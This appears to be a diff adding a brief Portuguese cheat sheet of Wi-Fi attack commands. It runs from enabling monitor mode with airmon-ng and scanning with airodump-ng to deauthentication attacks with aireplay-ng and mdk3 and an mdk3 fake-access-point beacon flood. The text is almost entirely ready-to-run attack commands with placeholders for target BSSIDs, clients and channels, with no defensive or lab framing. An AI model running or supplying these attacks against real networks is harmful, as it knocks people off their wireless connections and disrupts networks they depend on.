@@ -1,0 +1,29 @@
+Linha de comando:
+
+Mostrando dispositivos de rede:
+
+# ifconfig
+
+Ativando interface de monitoramento:
+
+# airmon-ng start wlan0
+
+Monitorando o ar:
+
+# airodump-ng wlan0mon
+
+Ataque de desautenticação Aireplay-ng:
+
+# aireplay-ng -0 <numero de repeticoes do ataque> -a <bssid> -c <especificando bssid cliente> wlan0mon
+
+Ataque de desautenticação MDK3:
+
+# mdk3 wlan0mon d -b <blacklist> -c <canal>
+
+Ataque de falsos APs MDK3:
+
+# mdk3 wlan0mon b
+
+Lista de todos ataque e comandos MDK3
+
+# mdk3 --fullhelp
